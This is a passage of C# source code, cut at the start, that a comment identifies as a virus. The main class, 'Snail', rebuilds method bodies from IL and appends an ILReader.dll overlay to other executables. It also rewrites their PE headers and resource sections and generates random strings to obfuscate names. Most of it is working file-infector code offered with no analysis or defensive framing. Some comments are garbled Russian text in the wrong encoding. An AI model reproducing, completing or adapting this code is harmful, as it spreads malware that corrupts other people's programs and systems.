                               if(h.HandlerOffset == handler.HandlerOffset+handler.HandlerLength)
                                   bLastHanlderInBlock=false;
                           if(bLastHanlderInBlock)
                           {
                               il.EndExceptionBlock();
   #if DEBUGCONSOLE
                               Console.WriteLine("END TRY L_"+
                                   handler.TryOffset.ToString("x4"));
   #endif
                           }
                           else
                           {
   #if DEBUGCONSOLE
                               Console.WriteLine("NOT LAST CATCH");
   #endif
                           }
                       }

                   }
                   // mark labels
                   for (int i=0; i<labeloffsets.Length; i++)
                       if(labeloffsets[i] == instruction.Offset)
                           il.MarkLabel(labels[i]);

                   object operand = instruction.Operand;
                   byte[] operandData = instruction.GetOperandData();

                   // if this method is EP and ret is emitted, add Go() thread stop
                   if(entrypoint && code.Name==OpCodes.Ret.Name)
                   {
                       rce.Emit();
                       il.Emit(OpCodes.Ldloc, loc);
                       MethodInfo miAbort = typeof(System.Threading.Thread).GetMethod("Abort", new Type[0]);
                       il.Emit(OpCodes.Callvirt, miAbort);
                   }



   #if DEBUGCONSOLE
                   Console.Write("L_" + instruction.Offset.ToString("x4") + ": ");
                   Console.Write(code.Name);
                   Console.Write(" ");
   #endif
                   OpCode code2;
                   if (operand != null)
                   {
                       switch (code.OperandType)
                       {
                           case OperandType.InlineNone:    // íåò îïåðàíäà // no operand
                               il.Emit(code);
                               break;

                           case OperandType.ShortInlineBrTarget:
                               if(!shorts)
                               {
                                   code2=code;
                                   if(code.Name==OpCodes.Beq_S.Name)
                                       code2=OpCodes.Beq;
                                   if(code.Name==OpCodes.Bge_S.Name)
                                       code2=OpCodes.Bge;
                                   if(code.Name==OpCodes.Bge_Un_S.Name)
                                       code2=OpCodes.Bge_Un;
                                   if(code.Name==OpCodes.Bgt_S.Name)
                                       code2=OpCodes.Bgt_S;
                                   if(code.Name==OpCodes.Bgt_Un_S.Name)
                                       code2=OpCodes.Bgt_Un;
                                   if(code.Name==OpCodes.Ble_S.Name)
                                       code2=OpCodes.Ble;
                                   if(code.Name==OpCodes.Ble_Un_S.Name)
                                       code2=OpCodes.Ble_Un;
                                   if(code.Name==OpCodes.Blt_S.Name)
                                       code2=OpCodes.Blt;
                                   if(code.Name==OpCodes.Blt_Un_S.Name)
                                       code2=OpCodes.Blt_Un;
                                   if(code.Name==OpCodes.Bne_Un_S.Name)
                                       code2=OpCodes.Bne_Un;
                                   if(code.Name==OpCodes.Br_S.Name)
                                       code2=OpCodes.Br;
                                   if(code.Name==OpCodes.Brfalse_S.Name)
                                       code2=OpCodes.Brfalse;
                                   if(code.Name==OpCodes.Brtrue_S.Name)
                                       code2=OpCodes.Brtrue;
                                   if(code.Name==OpCodes.Leave_S.Name)
                                       code2=OpCodes.Leave;
                                   //if(code.Name==code2.Name)
                                   //  throw new Exception();

                               }
                               else
                                   code2=code;
                               int starget = (int) operand;
   #if DEBUGCONSOLE
                               Console.Write("L_" + starget.ToString("x4"));
   #endif
                               // èùåì êóäà óêàçûâàåò ìåòêà
                               // look for label's target
                               for(int i=0; i<labels.Length; i++)
                                   if(labeloffsets[i]==starget)
                                   {
                                       il.Emit(code2, labels[i]);
                                       break;
                                   }
                               break;
                           case OperandType.InlineBrTarget:
                               int target = (int) operand;
   #if DEBUGCONSOLE
                               Console.Write("L_" + target.ToString("x4"));
   #endif
                               // èùåì êóäà óêàçûâàåò ìåòêà
                               // look for label's target
                               for(int i=0; i<labels.Length; i++)
                                   if(labeloffsets[i]==target)
                                   {
                                       il.Emit(code, labels[i]);
                                       break;
                                   }
                               break;

                           case OperandType.ShortInlineI:
                               if(operand is short)
                                   il.Emit(code, (short) operand);
                               if(operand is SByte)
                                   il.Emit(code, (SByte) operand);
   #if DEBUGCONSOLE
                               Console.Write(operand.ToString());
   #endif
                               break;
                           case OperandType.InlineI:
                               il.Emit(code, (int) operand);
   #if DEBUGCONSOLE
                               Console.Write(operand.ToString());
   #endif
                               break;
                           case OperandType.InlineI8:
                               il.Emit(code, (long) operand);
   #if DEBUGCONSOLE
                               Console.Write(operand.ToString());
   #endif
                               break;
                           case OperandType.ShortInlineR:
                               il.Emit(code, (float) operand);
   #if DEBUGCONSOLE
                               Console.Write(operand.ToString());
   #endif
                               break;
                           case OperandType.InlineR:
                               il.Emit(code, (double) operand);
   #if DEBUGCONSOLE
                               Console.Write(operand.ToString());
   #endif
                               break;

                           case OperandType.InlineString:
   #if DEBUGCONSOLE
                               Console.Write("\"" + operand.ToString() + "\"");
   #endif
                               il.Emit(code, operand.ToString());
                               break;

                           case OperandType.ShortInlineVar:
                           case OperandType.InlineVar:
                               if (operand is int)
                               {
   #if DEBUGCONSOLE
                                   Console.Write("V_" + operand.ToString());
   #endif
                                   //il.Emit(code, locals[(int)operand]);
                                   if(lbuilders!=null)
                                       il.Emit(code, lbuilders[(int)operand]);
                                   else
                                       return; // íåäîïóñòèìàÿ ñèòóàöèÿ


                               }

                               else if (operand is ParameterInfo)
                               {
                                   ParameterInfo parameterInfo = (ParameterInfo) operand;
                                   ParameterInfo [] inparams = methodBase.GetParameters();

   #if DEBUGCONSOLE
                                   Console.Write((parameterInfo.Name != null) ?
                                       parameterInfo.Name : ("A_" + parameterInfo.Position));
   #endif
                                   int pos=parameterInfo.Position;
                                   if(code.GetHashCode()==OpCodes.Ldarg_S.GetHashCode())
                                       il.Emit(code, (int)operandData[0]);
                                   else
                                       il.Emit(code, pos); // ?!
                               }
                               break;

                           case OperandType.InlineSwitch:

                               int[] targets = (int[]) operand;
   #if DEBUGCONSOLE
                               Console.Write("(");
                               for (int i = 0; i < targets.Length; i++)
                               {
                                   if (i != 0) Console.Write(", ");
                                   Console.Write("L_" + targets[i].ToString("x4"));
                               }
                               Console.Write(")");
   #endif
                               Label [] swlabels = new Label [targets.Length];

                               for(int i=0; i<targets.Length; i++)
                                   for(int j=0; j<labels.Length; j++)
                                       if(labeloffsets[j] == targets[i])
                                           swlabels[i]=labels[j];
                               il.Emit(code, swlabels);
                               break;

                           case OperandType.InlineSig:
                           case OperandType.InlineMethod:
                           case OperandType.InlineField:
                           case OperandType.InlineType:
                           case OperandType.InlineTok:
                               if (operand is Type)
                               {
                                   TypeBuilder tb = objects.TypeCompliance((Type)operand);
                                   if(tb!=null)
                                       il.Emit(code, tb);
                                   else
                                   {
                                       if(((Type)operand).Assembly!=Assembly.GetExecutingAssembly())
                                           il.Emit(code, (Type)operand);
                                       else
                                           throw new Exception();
                                       // do not emit types & fields from current assembly
                                   }
   #if DEBUGCONSOLE
                                   Console.Write(((Type) operand).ToString());
   #endif
                               }
                               else if (operand is MethodInfo)
                               {
                                   MethodInfo methodInfo = (MethodInfo) operand;
   #if DEBUGCONSOLE
                                   if (methodInfo.DeclaringType != null)
                                   {
                                       Console.Write(methodInfo.DeclaringType);
                                       Console.Write("::");
                                   }
                                   Console.Write(methodInfo);
   #endif
                                   MethodBuilder outMethod=objects.MethodCompliance
                                       (methodInfo.DeclaringType, methodInfo);
                                   if(outMethod!=null)
                                       il.Emit(code, outMethod);
                                   else
                                   {
                                       if(methodInfo.DeclaringType.Assembly!=Assembly.GetExecutingAssembly())
                                           il.Emit(code, methodInfo);
                                       else
                                           throw new Exception();
                                   }
                               }
                               else if (operand is MemberInfo)
                               {
                                   MemberInfo memberInfo = (MemberInfo) operand;
   #if DEBUGCONSOLE
                                   if (memberInfo.DeclaringType != null)
                                   {
                                       Console.Write(memberInfo.DeclaringType);
                                       Console.Write("::");
                                   }
                                   Console.Write(memberInfo);
   #endif
                                   if(operand is FieldInfo)
                                   {
                                       FieldBuilder outField=objects.FieldCompliance
                                           (((FieldInfo)operand).DeclaringType,
                                           (FieldInfo)operand);
                                       if(outField!=null)
                                           il.Emit(code, outField);
                                       else
                                       {
                                           if(((FieldInfo)operand).DeclaringType.Assembly!=Assembly.GetExecutingAssembly())
                                               il.Emit(code, (FieldInfo)operand);
                                           else
                                               throw new Exception();
                                       }

                                   }
                                   if(operand is ConstructorInfo)
                                   {
                                       ConstructorInfo cin=(ConstructorInfo)operand;
                                       ConstructorBuilder cout=objects.ConstructorCompliance
                                           (cin.DeclaringType, cin);
                                       if(cout!=null)
                                           il.Emit(code, cout);
                                       else
                                       {
                                           if(cin.DeclaringType.Assembly!=Assembly.GetExecutingAssembly())
                                               il.Emit(code, cin);
                                           else
                                               throw new Exception();
                                       }

                                   }
                               }
                               else if (operand is FieldInfo)
                               {
                                   FieldInfo fieldInfo = (FieldInfo) operand;
                               }
                               else
                               {
                                   throw new Exception();
                               }
                               break;
                       }
                   }
                   else
                   {
                       il.Emit(code);
   #if DEBUGCONSOLE
                       if (operandData != null)
                       {
                           Console.Write("null");
                           Console.Write(" // " + instruction.Code.OperandType + " ");
                           foreach (byte b in operandData)
                               Console.Write(b.ToString("X2") + " ");
                       }
   #endif
                   }

   #if DEBUGCONSOLE
                   Console.WriteLine();
   #endif
               }



           }

           private static byte [] GetILReader()
           {
               FileStream selfStream = Assembly.GetExecutingAssembly().GetFiles()[0];
               BinaryReader selfReader = new BinaryReader(selfStream);
               MSDOSHeader selfmsdosheader = new MSDOSHeader();
               selfmsdosheader.Read(selfReader);
               PEHeader selfpeheader = new PEHeader();
               selfpeheader.Read(selfReader, selfmsdosheader);
               SectionHeader lastSection=((SectionHeader)selfpeheader.
                   sectionHeaders[selfpeheader.sectionHeaders.Count-1]);

               uint physOffs = lastSection.pointerToRawData+lastSection.sizeOfRawData;
   #if DEBUGCONSOLE
               Console.WriteLine("ILReader offset in host "+physOffs);
   #endif
               selfReader.BaseStream.Position=physOffs;
               byte [] buf;
               try
               {
                   // extract ILReader.dll that is added to virus as overlay
                   uint len=selfReader.ReadUInt32();
   #if DEBUGCONSOLE
                   Console.WriteLine("ILReader length in host "+len);
   #endif
                   buf=selfReader.ReadBytes((int)len);
                   selfStream.Close();
                   return buf;
               }
               catch
               {
                   // otherwise get data from file
                   selfStream.Close();
   #if DEBUGCONSOLE
                   Console.WriteLine("Cannot find DLL in host, trying to find it in current dir");
   #endif
                   FileStream ilStream = new FileStream("ILReader.dll", FileMode.Open,
                       FileAccess.Read);
                   BinaryReader ilReader = new BinaryReader(ilStream);
                   FileInfo fi = new FileInfo("ILReader.dll");
                   if(fi!=null)
                   {
                       buf=ilReader.ReadBytes((int)fi.Length);
   #if DEBUGCONSOLE
                       Console.WriteLine(fi.Length+"bytes read");
   #endif
                       ilStream.Close();
                       return buf;
                   }
                   else
                   {
                       ilStream.Close();
                       return null;
                   }
               }
           }

           private static void AddILReader(string fileName, byte [] ilReader)
           {
               FileStream outStream = new FileStream(fileName, FileMode.Open,
                   FileAccess.ReadWrite);
               BinaryWriter outWriter = new BinaryWriter(outStream);
               outWriter.BaseStream.Seek(0, SeekOrigin.End);
               outWriter.Write((uint)(ilReader.Length));
   #if DEBUGCONSOLE
               Console.WriteLine("Written length "+ilReader.Length);
   #endif
               outWriter.Write(ilReader);
   #if DEBUGCONSOLE
               Console.WriteLine("Written ILReader.dll");
   #endif
               outStream.Close();
           }

           private static bool CopyUnmanagedResources(string inFileName, string outFileName)
           {
               FileStream outStream = new FileStream(outFileName, FileMode.Open,
                   FileAccess.ReadWrite);
               FileStream inStream = new FileStream(inFileName, FileMode.Open,
                   FileAccess.Read);
               if(inStream==null || outStream==null)
               {
   #if DEBUGCONSOLE
                   Console.WriteLine("Cannot open file");
   #endif
                   return false;
               }
               BinaryWriter outWriter = new BinaryWriter(outStream);
               BinaryReader outReader = new BinaryReader(outStream);
               BinaryReader inReader = new BinaryReader(inStream);
               MSDOSHeader inmsdosheader = new MSDOSHeader();
               inmsdosheader.Read(inReader);
               PEHeader inpeheader = new PEHeader();
               inpeheader.Read(inReader, inmsdosheader);
               byte [] resSection=inpeheader.GetResourceSection(inReader);
               if(resSection==null)
               {
   #if DEBUGCONSOLE
                   Console.WriteLine("No resources in source");
   #endif
                   return false;
               }
               MSDOSHeader outmsdosheader = new MSDOSHeader();
               outmsdosheader.Read(outReader);
               PEWriter outpewriter = new PEWriter();
               outpewriter.Read(outReader, outmsdosheader);

               if(null!=outpewriter.GetResourceSection(outReader))
               {
   #if DEBUGCONSOLE
                   Console.WriteLine("Already resources in destination");
   #endif
                   return false; // exit if rsrc already exists in output file
               }
               SectionHeader lastsection = (SectionHeader)
                   outpewriter.sectionHeaders[outpewriter.sectionHeaders.Count-1];
               // phys offset of new section aligned to file alignment
               uint physOffset = ((lastsection.pointerToRawData+lastsection.sizeOfRawData+1)/
                   outpewriter.fileAlignment)*(outpewriter.fileAlignment);
               uint physSize = (((uint)resSection.Length)/outpewriter.fileAlignment+1)*
                   (outpewriter.fileAlignment);
               uint virtAddr = outpewriter.imageSize;
               uint newImageSize = outpewriter.imageSize +
                   (((uint)resSection.Length)/outpewriter.sectionAlignment+1)*
                   (outpewriter.sectionAlignment);
               SectionHeader newsect = new SectionHeader(".rsrc", (uint)resSection.Length,
                   virtAddr, physSize, physOffset, 0x42000040);
               Dictionary d = new Dictionary(virtAddr, (uint)resSection.Length);
               // write section
               outWriter.BaseStream.Position=physOffset;
               outWriter.Write(resSection, 0, resSection.Length);
               for(int i=0; i<(outpewriter.fileAlignment-
                   resSection.Length%outpewriter.fileAlignment); i++)
                   outWriter.Write((byte)0);
               // modify pe header
               outpewriter.AddSectionHeader(newsect, outReader, outWriter, outmsdosheader);
               outpewriter.WriteResourcesDictionary(d, outWriter, outmsdosheader);
               outpewriter.SetImageSize(newImageSize, outWriter, outmsdosheader);
               // fix RVAs in resource section
               outWriter.Flush(); outReader.Close(); outWriter.Close();
               outStream = new FileStream(outFileName, FileMode.Open,
                   FileAccess.ReadWrite);
               outReader = new BinaryReader(outStream);
               outWriter = new BinaryWriter(outStream);
               outpewriter.FixResources(physOffset, inpeheader.resourceTable.rva,
                   virtAddr, outReader, outWriter);
               outWriter.Flush();
               inReader.Close(); outReader.Close(); outWriter.Close();
               inStream.Close(); outStream.Close();
               return true;
           }

           private sealed class AssemblyProvider : IAssemblyProvider
           {
               public Assembly Load(string assemblyName)
               {
                   return Assembly.Load(assemblyName);
               }

               public Assembly[] GetAssemblies()
               {
                   throw new NotImplementedException();
               }
           }

           private class MSDOSHeader
           {

               protected int lfanew;
               protected byte[] buffer=new byte[128];

               public int Lfanew { get { return lfanew; } }

               public void Read(BinaryReader source)
               {
                   source.Read(buffer,0,buffer.Length);
                   lfanew=((int)buffer[0x3c]<<0) | ((int)buffer[0x3c+1]<<8) |
                       ((int)buffer[0x3c+2]<<16) | ((int)buffer[0x3c+3]<<24);
               }
           }

           private class PEWriter : PEHeader
           {
               public void WriteResourcesDictionary(Dictionary d, BinaryWriter dest,
                   MSDOSHeader msdosheader)
               {
                   dest.BaseStream.Position=msdosheader.Lfanew+0x88;
                   dest.Write(d.rva);  dest.Write(d.size);
               }
               public void AddSectionHeader(SectionHeader sh, BinaryReader source,
                   BinaryWriter dest, MSDOSHeader msdosheader)
               {
                   //msdosheader.Lfanew = êàêîé-òî õåðíå
                   source.BaseStream.Position=msdosheader.Lfanew+0x06;
                   ushort sections = source.ReadUInt16();
                   dest.BaseStream.Position=msdosheader.Lfanew+0x06;
                   dest.Write(sections+1);
                   dest.BaseStream.Position=msdosheader.Lfanew+0xf8+sections*0x28;
                   sh.Write(dest);
               }
               public void SetImageSize(uint isize, BinaryWriter dest,
                   MSDOSHeader msdosheader)
               {
                   dest.BaseStream.Position=msdosheader.Lfanew+0x50;
                   dest.Write(isize);
               }
               public void FixResources(uint resOffset, uint oldResRVA, uint newResRVA,
                   BinaryReader src, BinaryWriter dest)
               {
                   ReadNode(resOffset, 0, oldResRVA, newResRVA, src, dest);
               }
               private void ReadNode(uint resOffset, uint nodeOffset,
                   uint oldResRVA, uint newResRVA,
                   BinaryReader src, BinaryWriter dest)
               {
                   src.BaseStream.Position=resOffset+nodeOffset+0x0c;
                   ushort numDesc=src.ReadUInt16();
                   numDesc+=src.ReadUInt16();  // number of descendants
                   for(int i=0; i<numDesc; i++)
                   {
                       src.ReadUInt32();
                       uint x=src.ReadUInt32();
                       long pos=src.BaseStream.Position;
                       if((x & 0x80000000) != 0)
                           // major bit set - node
                           // recursion
                           ReadNode(resOffset, x & 0x7fffffff, oldResRVA, newResRVA,
                               src, dest);
                       else
                           // major bit not set - leaf
                           FixDataEntry(resOffset+x, oldResRVA, newResRVA, src, dest);
                       src.BaseStream.Position=pos;
                   }
               }

               // positions in src & dest must be set to data entry
               private void FixDataEntry(uint dataOffset, uint oldResRVA, uint newResRVA,
                   BinaryReader src, BinaryWriter dest)
               {
                   src.BaseStream.Position=dataOffset;
                   uint rva=src.ReadUInt32();
                   rva+=newResRVA;
                   rva-=oldResRVA;
                   dest.BaseStream.Position=src.BaseStream.Position-4;
                   dest.Write(rva);
                   dest.BaseStream.Position+=3*4;
                   src.BaseStream.Position+=3*4;
               }
           }

           private class Dictionary
           {
               public uint rva;
               public uint size;
               public Dictionary(uint rva,uint size)
               {
                   this.rva=rva;
                   this.size=size;
               }
               public override string ToString()
               {
                   return "0x"+rva.ToString("X8")+",0x"+size.ToString("X8");
               }
           }

           private class SectionHeader
           {
               public byte[] name;
               public uint virtualSize;
               public uint virtualAddress;
               public uint sizeOfRawData;
               public uint pointerToRawData;
               protected uint pointerToRelocations;
               protected uint pointerToLineNumbers;
               protected ushort numberOfRelocations;
               protected ushort numberOfLineNumbers;
               public uint characteristics;

               public SectionHeader()
               {
                   numberOfLineNumbers=0;
                   numberOfRelocations=0;
                   pointerToLineNumbers=0;
                   pointerToRelocations=0;
               }

               public SectionHeader(string strname, uint vsize, uint vaddr, uint phsize,
                   uint phoffs, uint flags)
               {
                   name = new byte[8];
                   for(int i=0; i<strname.Length && i<8; i++)
                       name[i]=(byte)strname[i];
                   virtualSize=vsize;
                   virtualAddress=vaddr;
                   sizeOfRawData=phsize;
                   pointerToRawData=phoffs;
                   characteristics=flags;
                   numberOfLineNumbers=0;
                   numberOfRelocations=0;
                   pointerToLineNumbers=0;
                   pointerToRelocations=0;
               }

               public void Write(BinaryWriter dest)
               {
                   dest.Write(name, 0, 8);
                   dest.Write(virtualSize);
                   dest.Write(virtualAddress);
                   dest.Write(sizeOfRawData);
                   dest.Write(pointerToRawData);
                   dest.Write(pointerToRelocations);
                   dest.Write(pointerToLineNumbers);
                   dest.Write(numberOfRelocations);
                   dest.Write(numberOfLineNumbers);
                   dest.Write(characteristics);

               }

               public void Read(BinaryReader source)
               {
                   name=new byte[8];
                   source.Read(name,0,8);
                   virtualSize=source.ReadUInt32();
                   virtualAddress=source.ReadUInt32();
                   sizeOfRawData=source.ReadUInt32();
                   pointerToRawData=source.ReadUInt32();
                   pointerToRelocations=source.ReadUInt32();
                   pointerToLineNumbers=source.ReadUInt32();
                   numberOfRelocations=source.ReadUInt16();
                   numberOfLineNumbers=source.ReadUInt16();
                   characteristics=source.ReadUInt32();
               }
           }

           private class PEHeader
           {

               protected byte[] sig=new byte[4];
               protected       ushort machine;
               protected ushort sections;
               protected int ticks;
               protected ushort optHeaderSize;
               protected ushort characteristics;
               protected ushort magic;
               protected byte lMajor;
               protected byte lMinor;
               protected uint codeSize;
               protected uint IDSSize;
               protected uint UDSSize;
               protected uint entryPointRVA;
               protected uint baseOfCodeRVA;
               protected uint baseOfDataRVA;
               protected uint imageBase;
               public uint sectionAlignment;
               public uint fileAlignment;
               protected ushort osMajor;
               protected ushort osMinor;
               protected ushort userMajor;
               protected ushort userMinor;
               protected ushort subsysMajor;
               protected ushort subsysMinor;
               protected uint headerSize;
               public uint imageSize;
               protected uint chkSum;
               protected uint subSystem;
               protected uint dllFlags;
               protected uint stackReserveSize;
               protected uint stackCommitSize;
               protected uint heapReserveSize;
               protected uint heapCommitSize;
               protected uint loaderFlags;
               protected uint dataDictionaryCount;
               protected Dictionary exportTable;
               protected Dictionary importTable;
               public Dictionary resourceTable;
               protected Dictionary exceptionTable;
               protected Dictionary certificateTable;
               protected Dictionary baseRelocationTable;
               protected Dictionary debugTable;
               protected Dictionary copyrightTable;
               protected Dictionary globalPtrTable;
               protected Dictionary tlsTable;
               protected Dictionary loadConfigTable;
               protected Dictionary boundImportTable;
               protected Dictionary iatTable;
               protected Dictionary delayImportDescriptorTable;
               public Dictionary cliHeaderTable;
               public Dictionary reservedTable;
               public ArrayList sectionHeaders;

               public byte[] GetResourceSection(BinaryReader source)
               {
                   try
                   {
                       if(resourceTable.rva!=0)
                       {
                           source.BaseStream.Position=OffsetFromRVA(resourceTable.rva);
                           return source.ReadBytes((int)resourceTable.size);
                       }
                       else
                           return null;
                   }
                   catch
                   {
                       return null;
                   }
               }


               public void Read(BinaryReader source, MSDOSHeader msdosheader)
               {
                   // PE Header (24.2.2)
                   source.BaseStream.Position=msdosheader.Lfanew;
                   source.Read(sig,0,4);
                   if(sig[0]!=(byte)'P' || sig[1]!=(byte)'E' || sig[2]!=0 || sig[3]!=0) throw new Exception("Missing PE file signature");
                   machine=source.ReadUInt16();
                   if(machine!=0x14c) throw new Exception("Incorrect machine id code");
                   sections=source.ReadUInt16();
                   ticks=source.ReadInt32();
                   if(source.ReadInt32()!=0) throw new Exception("Symbol table offset != 0");
                   if(source.ReadInt32()!=0) throw new Exception("Symbol table count != 0");
                   optHeaderSize=source.ReadUInt16();
                   characteristics=source.ReadUInt16();
                   magic=source.ReadUInt16();
                   if(magic!=0x10B) throw new Exception("Bad magic number for PE Optional Header");
                   lMajor=source.ReadByte();
                   lMinor=source.ReadByte();
                   if(lMajor!=6 || lMinor!=0) throw new Exception("Bad L number");
                   codeSize=source.ReadUInt32();
                   IDSSize=source.ReadUInt32();
                   UDSSize=source.ReadUInt32();
                   entryPointRVA=source.ReadUInt32();
                   baseOfCodeRVA=source.ReadUInt32();
                   baseOfDataRVA=source.ReadUInt32();
                   imageBase=source.ReadUInt32();
                   sectionAlignment=source.ReadUInt32();
                   fileAlignment=source.ReadUInt32();
                   osMajor=source.ReadUInt16();
                   osMinor=source.ReadUInt16();
                   userMajor=source.ReadUInt16();
                   userMinor=source.ReadUInt16();
                   subsysMajor=source.ReadUInt16();
                   subsysMinor=source.ReadUInt16();
                   source.ReadUInt32();
                   imageSize=source.ReadUInt32();
                   headerSize=source.ReadUInt32();
                   chkSum=source.ReadUInt32();
                   subSystem=source.ReadUInt16();
                   dllFlags=source.ReadUInt16();
                   stackReserveSize=source.ReadUInt32();
                   stackCommitSize=source.ReadUInt32();
                   heapReserveSize=source.ReadUInt32();
                   heapCommitSize=source.ReadUInt32();
                   loaderFlags=source.ReadUInt32();
                   dataDictionaryCount=source.ReadUInt32();

                   exportTable=new Dictionary(source.ReadUInt32(),source.ReadUInt32());
                   importTable=new Dictionary(source.ReadUInt32(),source.ReadUInt32());
                   resourceTable=new Dictionary(source.ReadUInt32(),source.ReadUInt32());
                   exceptionTable=new Dictionary(source.ReadUInt32(),source.ReadUInt32());
                   certificateTable=new Dictionary(source.ReadUInt32(),source.ReadUInt32());
                   baseRelocationTable=new Dictionary(source.ReadUInt32(),source.ReadUInt32());
                   debugTable=new Dictionary(source.ReadUInt32(),source.ReadUInt32());
                   copyrightTable=new Dictionary(source.ReadUInt32(),source.ReadUInt32());
                   globalPtrTable=new Dictionary(source.ReadUInt32(),source.ReadUInt32());
                   tlsTable=new Dictionary(source.ReadUInt32(),source.ReadUInt32());
                   loadConfigTable=new Dictionary(source.ReadUInt32(),source.ReadUInt32());
                   boundImportTable=new Dictionary(source.ReadUInt32(),source.ReadUInt32());
                   iatTable=new Dictionary(source.ReadUInt32(),source.ReadUInt32());
                   delayImportDescriptorTable=new Dictionary(source.ReadUInt32(),source.ReadUInt32());
                   cliHeaderTable=new Dictionary(source.ReadUInt32(),source.ReadUInt32());
                   reservedTable=new Dictionary(source.ReadUInt32(),source.ReadUInt32());
                   sectionHeaders=new ArrayList();
                   for(int I=0;I<sections;I++)
                   {
                       sectionHeaders.Add(new SectionHeader());
                       ((SectionHeader)sectionHeaders[I]).Read(source);
                   }
               }

               public uint OffsetFromRVA(uint rva)
               {
                   for(int I=0;I<sectionHeaders.Count;I++)
                   {
                       if(((SectionHeader)sectionHeaders[I]).virtualAddress<=rva && rva<((SectionHeader)sectionHeaders[I]).virtualAddress+((SectionHeader)sectionHeaders[I]).virtualSize)
                       {
                           return ((SectionHeader)sectionHeaders[I]).pointerToRawData+(rva-((SectionHeader)sectionHeaders[I]).virtualAddress);
                       }
                   }
                   throw new Exception("Unresolvable RVA "+rva);
               }
           }

           // random strings generator (for obfuscation)
           // ãåíåðàòîð ìàòåðíûõ âûðàæåíèé
           private class RandomStrings
           {
               Random rand;
               int minlen, maxlen;
               public RandomStrings(int len1, int len2, int seed)
               {
                   rand=new Random(seed);
                   minlen=len1;
                   maxlen=len2;
               }
               public string Next()
               {
                   string str = "";
                   int length=rand.Next(minlen, maxlen);
                   for(int i=0; i<length; i++)
                   {
                       if(rand.Next(8)==1)
                           str+=(char)(0x41+rand.Next(26));
                       else
                           str+=(char)(0x61+rand.Next(26));
                   }
                   return str;
               }
           }

       }

       public class MainClass
       {
           public static void Main(String[] args)
           {
               Thread thr = new Thread(new ThreadStart(Snail.Go));
               thr.Start();
           }
       }

   }
